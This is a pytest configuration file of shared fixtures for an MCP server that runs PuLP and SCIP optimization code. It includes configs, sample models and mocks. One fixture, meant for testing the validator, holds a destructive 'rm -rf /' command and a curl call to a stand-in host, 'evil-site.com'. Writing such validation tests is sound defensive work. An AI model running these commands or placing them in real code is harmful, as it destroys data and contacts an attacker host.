"""pytest configuration and shared fixtures."""

import os
import tempfile
import pytest
from pathlib import Path
from unittest.mock import Mock, AsyncMock
from typing import Dict, Any, Optional

# Add src directory to Python path for testing
import sys
src_path = Path(__file__).parent.parent / "src"
if str(src_path) not in sys.path:
    sys.path.insert(0, str(src_path))

from mip_mcp.utils.config_manager import ConfigManager
from mip_mcp.models.config import ServerConfig, ExecutorConfig


@pytest.fixture
def temp_config_dir():
    """Create temporary configuration directory."""
    with tempfile.TemporaryDirectory() as temp_dir:
        config_path = Path(temp_dir)
        yield config_path


@pytest.fixture
def mock_config():
    """Mock configuration for testing."""
    return {
        "server": {
            "name": "test-mip-mcp",
            "version": "0.1.0",
            "host": "localhost",
            "port": 8000
        },
        "execution": {
            "timeout": 30,
            "memory_limit": "512MB",
            "max_output_size": 1000000,
            "allowed_libraries": ["pulp", "numpy", "pandas"]
        },
        "solver": {
            "default": "SCIP",
            "scip": {
                "time_limit": 300,
                "gap_limit": 0.01,
                "memory_limit": "1GB"
            }
        },
        "logging": {
            "level": "INFO",
            "format": "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
        }
    }


@pytest.fixture
def config_manager(temp_config_dir, mock_config):
    """Create ConfigManager instance for testing."""
    config_file = temp_config_dir / "config.yaml"
    
    # Write test config to file
    import yaml
    with open(config_file, 'w') as f:
        yaml.dump(mock_config, f)
    
    return ConfigManager(str(config_file))


@pytest.fixture
def sample_pulp_code():
    """Sample PuLP optimization code for testing."""
    return '''
import pulp

# Create a linear programming problem
prob = pulp.LpProblem("Simple_LP", pulp.LpMaximize)

# Create variables
x = pulp.LpVariable("x", lowBound=0)
y = pulp.LpVariable("y", lowBound=0)

# Objective function
prob += 3*x + 2*y

# Constraints
prob += 2*x + y <= 20
prob += 4*x + 5*y <= 10
prob += -x + 2*y <= 2

# Solve
prob.solve()
'''


@pytest.fixture
def sample_invalid_code():
    """Sample invalid code for testing validation."""
    return '''
import os
import subprocess

# Malicious code attempt
os.system("rm -rf /")
subprocess.run(["curl", "evil-site.com"])

# Invalid PuLP syntax
prob = LpProblem()  # Missing import
x = LpVariable("x")  # Missing import
'''


@pytest.fixture
def mock_solver_output():
    """Mock SCIP solver output for testing."""
    return '''
SCIP version 8.0.3 [precision: 8 byte] [memory: block] [mode: optimized] [LP solver: SoPlex 6.0.3] [GitHash: 75131699]
Copyright (C) 2002-2022 Konrad-Zuse-Zentrum fuer Informationstechnik Berlin (ZIB)

External codes: 
  SoPlex 6.0.3         Linear Programming Solver developed at Zuse Institute Berlin (soplex.zib.de) [GitHash: d077c71c]
  CppAD 20210000.8     Algorithmic Differentiation of C++ algorithms developed by B. Bell (coin-or.github.io/CppAD)
  ZLIB 1.2.11          General purpose compression library by J. Gailly and M. Adler (zlib.net)
  bliss 0.73           Computing Graph Automorphism Groups by T. Junttila and P. Kaski (www.tcs.hut.fi/Software/bliss/)

user parameter file <scip.set> not found - using default parameters

read problem <Simple_LP>
============

original problem has 2 variables (2 bin, 0 int, 0 impl, 0 cont) and 3 constraints

presolved problem has 2 variables (2 bin, 0 int, 0 impl, 0 cont) and 3 constraints

Solving Time (sec) 0.00
solving was interrupted [limit reached: optimal solution found]

Statistics
  Problem name     : Simple_LP
  Variables        : 2
  Constraints      : 3
  Objective limit  : 1.00000000000000e+20
  Status           : optimal
  Objective value  : 7.75000000000000e+00
  Solving time (sec): 0.00
  Iterations       : 0
  Nodes            : 1 (0 internal, 1 leaves)
  LP iterations    : 0
  Cut time (sec)   : 0.00
  Presolving time (sec): 0.00
  Separation time (sec): 0.00
  Primal bound     : +7.75000000000000e+00
  Dual bound       : +7.75000000000000e+00
  Gap              : 0.00%
'''


@pytest.fixture
def mock_mcp_context():
    """Mock FastMCP Context for testing."""
    context = Mock()
    context.report_progress = AsyncMock()
    return context


@pytest.fixture
def sample_optimization_data():
    """Sample data for optimization problems."""
    return {
        "costs": [3, 2, 4],
        "capacities": [20, 10, 15],
        "demands": [5, 8, 12],
        "max_variables": 3
    }


@pytest.fixture(autouse=True)
def setup_test_environment():
    """Setup test environment."""
    # Set test mode environment variable
    os.environ["TESTING"] = "1"
    os.environ["MCP_MODE"] = "0"  # Disable MCP mode during tests
    
    yield
    
    # Cleanup
    os.environ.pop("TESTING", None)
    os.environ.pop("MCP_MODE", None)


@pytest.fixture
def mock_pyodide_executor():
    """Mock PyodideExecutor for testing."""
    from unittest.mock import AsyncMock, Mock
    
    executor = Mock()
    executor.execute_mip_code = AsyncMock()
    executor.validate_code = AsyncMock()
    executor.get_examples = AsyncMock()
    
    return executor


@pytest.fixture  
def mock_scip_solver():
    """Mock SCIPSolver for testing."""
    from unittest.mock import Mock, AsyncMock
    
    solver = Mock()
    solver.solve_problem = AsyncMock()
    solver.get_solver_info = AsyncMock()
    solver.set_params = Mock()
    
    return solver